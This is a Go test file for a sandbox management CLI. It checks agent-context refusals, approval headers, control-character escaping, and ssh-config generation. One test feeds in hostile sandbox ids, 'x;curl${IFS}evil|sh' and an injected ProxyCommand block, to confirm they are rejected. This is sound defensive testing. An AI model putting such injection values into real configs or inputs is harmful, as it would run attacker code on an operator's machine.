// Inside an agent's command every subcommand is refused before anything
// reaches the server.
func TestRefusedInAgent(t *testing.T) {
	r := newRig(t)
	before := r.requests.Load()
	for _, args := range [][]string{{"list"}, {"create"}, {"exec", "sbx_0000000000000000", "--", "true"},
		{"connect", "--stdio", "sbx_0000000000000000"}, {"ssh-config"}, {"template", "list"}, {"cp", "a", "sbx_0000000000000000:b"}} {
		res := r.runWith(t, runOpts{inAgent: "ABHED_SANDBOX is set"}, args...)
		// Not allowed, as the usage's exit table says for 3.
		if res.code != ExitAuth || !strings.Contains(res.err, "refused inside an agent's command") {
			t.Errorf("%v: %+v", args, res)
		}
	}
	if n := r.requests.Load() - before; n != 0 {
		t.Fatalf("%d requests reached the server", n)
	}
}

// A server with the control plane off has no sandbox routes; its router's
// bare 404 is said plainly instead of passed on.
func TestControlPlaneOff(t *testing.T) {
	r := newRig(t)
	r.setWrap(func(w http.ResponseWriter, req *http.Request, _ http.Handler) bool {
		if strings.HasPrefix(req.URL.Path, "/v1/sandbox") {
			http.NotFound(w, req)
			return true
		}
		return false
	})
	for _, args := range [][]string{{"list"}, {"get", "sbx_0000000000000000"}, {"template", "list"}} {
		res := r.run(t, args...)
		if res.code != ExitFailed || !strings.Contains(res.err, "serves no sandbox API: its control plane is off (control_plane.enabled)") ||
			strings.Contains(res.err, "404 page not found") {
			t.Errorf("%v: %+v", args, res)
		}
	}
	// A sandbox the server does not have is still a 404 of its own.
	r.setWrap(nil)
	if res := r.run(t, "get", "sbx_0000000000000000"); res.code != ExitNotFound || strings.Contains(res.err, "control plane is off") {
		t.Errorf("missing sandbox: %+v", res)
	}
}

// With the control plane off, a server whose router has a GET catch-all
// answers the other verbs with a bare 405; that is said plainly too.
func TestControlPlaneOffOtherVerbs(t *testing.T) {
	r := newRig(t)
	off := http.NewServeMux()
	off.HandleFunc("GET /", http.NotFound)
	r.setWrap(func(w http.ResponseWriter, req *http.Request, _ http.Handler) bool {
		if strings.HasPrefix(req.URL.Path, "/v1/sandbox") {
			off.ServeHTTP(w, req)
			return true
		}
		return false
	})
	const id = "sbx_0000000000000000"
	for _, args := range [][]string{{"create"}, {"exec", id, "--", "true"}, {"stop", id}, {"start", id},
		{"delete", "-y", id}, {"snapshot", id}, {"expose", id, "8000"}, {"ssh-config", id}, {"get", id}} {
		res := r.run(t, args...)
		if res.code != ExitFailed || !strings.Contains(res.err, "serves no sandbox API: its control plane is off (control_plane.enabled)") ||
			strings.Contains(res.err, "Method Not Allowed") {
			t.Errorf("%v: %+v", args, res)
		}
	}
}

func TestClean(t *testing.T) {
	for in, want := range map[string]string{
		"plain":              "plain",
		"a\x1b]0;title\x07b": `a\x1b]0;title\x07b`,
		"line\nnext\r":       `line\nnext\x0d`,
		"\u009bcsi":          `\x9bcsi`,
		"ünïcode":            "ünïcode",
	} {
		if got := clean(in, 0); got != want {
			t.Errorf("clean(%q) = %q, want %q", in, got, want)
		}
	}
	if got := clean("abcdef", 3); got != "abc…" {
		t.Errorf("bounded: %q", got)
	}
}

// A server that lists ids no sandbox could have never gets them into ssh
// config, where a ProxyCommand would run them on the operator's machine.
func TestSSHConfigRefusesListedBadIDs(t *testing.T) {
	r := newRig(t)
	pub := string(ssh.MarshalAuthorizedKey(r.hostKey.PublicKey()))
	pub = strings.TrimSpace(pub)
	for _, bad := range []string{"x;curl${IFS}evil|sh", "sbx_0000000000000000\nHost *\n  ProxyCommand sh"} {
		r.setWrap(func(w http.ResponseWriter, req *http.Request, next http.Handler) bool {
			w.Header().Set("Content-Type", "application/json")
			if req.Method == http.MethodGet && req.URL.Path == "/v1/sandboxes" {
				_ = json.NewEncoder(w).Encode(map[string]any{"items": []map[string]any{{"id": bad}}})
				return true
			}
			if strings.HasSuffix(req.URL.Path, ":ssh") {
				alias := "abhed-" + bad
				_ = json.NewEncoder(w).Encode(map[string]any{"host_alias": alias, "user": "sandbox", "host_key": pub,
					"known_hosts": alias + " " + pub, "fingerprint": "f"})
				return true
			}
			return false
		})
		res := r.run(t, "ssh-config")
		if res.code == 0 || strings.Contains(res.out, "curl") || strings.Contains(res.out, "Host") {
			t.Fatalf("ssh-config with %q: %+v", bad, res)
		}
	}
}

// What the server names (ids, the next page, snapshot fields, an exposure's
// URL) reaches the terminal with its control characters escaped.
func TestServerTextIsCleanedOnTheTerminal(t *testing.T) {
	r := newRig(t)
	esc := "\x1b]0;owned\x07"
	id := "sbx_0123456789abcdef"
	r.setWrap(func(w http.ResponseWriter, req *http.Request, next http.Handler) bool {
		w.Header().Set("Content-Type", "application/json")
		switch {
		case req.Method == http.MethodGet && req.URL.Path == "/v1/sandboxes":
			_ = json.NewEncoder(w).Encode(map[string]any{"items": []map[string]any{{"id": "sbx_" + esc, "state": "Ready"}}, "next": esc})
		case strings.HasSuffix(req.URL.Path, ":snapshot"):
			w.WriteHeader(http.StatusCreated)
			_ = json.NewEncoder(w).Encode(map[string]any{"snapshot": map[string]any{"id": "snap" + esc, "name": esc, "digest": esc}, "generation": 1})
		case strings.HasSuffix(req.URL.Path, ":expose"):
			w.WriteHeader(http.StatusCreated)
			_ = json.NewEncoder(w).Encode(map[string]any{"url": "http://x/" + esc, "path": "/v1/exposed/x/"})
		default:
			return false
		}
		return true
	})
	for _, args := range [][]string{{"list"}, {"snapshot", id, "-name", "n"}, {"expose", id, "8000"}} {
		res := r.run(t, args...)
		if strings.ContainsAny(res.out+res.err, "\x1b\x07") {
			t.Errorf("%v printed a raw control character: %q %q", args, res.out, res.err)
		}
		if !strings.Contains(res.out+res.err, `\x1b`) {
			t.Errorf("%v did not show the escaped text: %q %q", args, res.out, res.err)
		}
	}
}

// A command refused until others approve it exits 6 and names the approval;
// sent again with -approval, each request carries it, streams included.
func TestApprovalFlag(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	var mu sync.Mutex
	var seen []string
	r.setWrap(func(w http.ResponseWriter, req *http.Request, next http.Handler) bool {
		if !strings.Contains(req.URL.Path, ":exec") {
			return false
		}
		mu.Lock()
		seen = append(seen, req.Header.Get("Abhed-Approval"))
		mu.Unlock()
		if req.Header.Get("Abhed-Approval") == "apr_7" {
			return false
		}
		w.Header().Set("Abhed-Approval", "apr_7")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusForbidden)
		_, _ = io.WriteString(w, `{"error":{"code":"approval_required","message":"approval required: two people approve exec (approval apr_7)"}}`)
		return true
	})
	for _, args := range [][]string{{"exec", sb.ID, "--", "true"}, {"exec", "-i", sb.ID, "--", "true"}} {
		res := r.runWith(t, runOpts{in: strings.NewReader("")}, args...)
		if res.code != ExitApproval || !strings.Contains(res.err, "-approval apr_7") {
			t.Fatalf("%v: %+v", args, res)
		}
		again := append([]string{args[0], "-approval", "apr_7"}, args[1:]...)
		if res := r.runWith(t, runOpts{in: strings.NewReader("")}, again...); res.code != 0 {
			t.Fatalf("%v: %+v", again, res)
		}
	}
	mu.Lock()
	defer mu.Unlock()
	if len(seen) != 4 || seen[0] != "" || seen[1] != "apr_7" || seen[2] != "" || seen[3] != "apr_7" {
		t.Fatalf("approvals sent %q", seen)
	}
}
